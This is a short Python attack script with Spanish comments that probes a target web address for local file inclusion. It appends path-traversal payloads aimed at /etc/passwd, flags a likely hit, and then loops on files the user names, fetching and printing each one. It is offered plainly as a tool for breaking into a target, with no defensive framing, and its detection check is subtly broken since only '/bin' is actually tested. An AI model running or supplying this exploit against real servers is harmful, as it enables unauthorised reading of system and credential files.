#! /usr/bin/env python3
#_*_ coding: utf8_*_

import requests
import argparse
from bs4 import BeautifulSoup
import time

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help="Objetivo a vulnerar")
parser = parser.parse_args()

def main():
    payloads = ['../../../../../etc/passwd','../../../../etc/passwd','/etc/passwd']
    if parser.target:
        print('Objetivo => {}'.format(parser.target))

        for p in payloads:
            print('\n===========================================================')
            print('Objetivo => {}'.format(parser.target + p))
            query = requests.get(parser.target + p)
            if 'root' and 'bash' and '/bin' in query.text:
                print('Probable LFI ==> {}'.format(parser.target + p))
                b = BeautifulSoup(query.text,'html5lib')
                print(b.blockquote.text)
                op = input('Desea consultar archivos ==> S/n: ')
                if op.lower() == 's':#lower convierte en minusculas el texto que se introduzca
                 while True:
                     files = input('Archivo ==> ')
                     query_file = requests.get(parser.target+files)
                     if not "Warning" in query_file.text:
                         bf = BeautifulSoup(query_file.text,'html5lib')
                         print(bf.blockquote.text)
                     else:
                          print('Fallo en la consula del archivo')
                else:
                    time.sleep(1)
                    exit()

                print('\n===========================================================')

    else:
        print('Especifique el objetivo')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        time.sleep(1)
        print('\nSaliendo')
        exit()
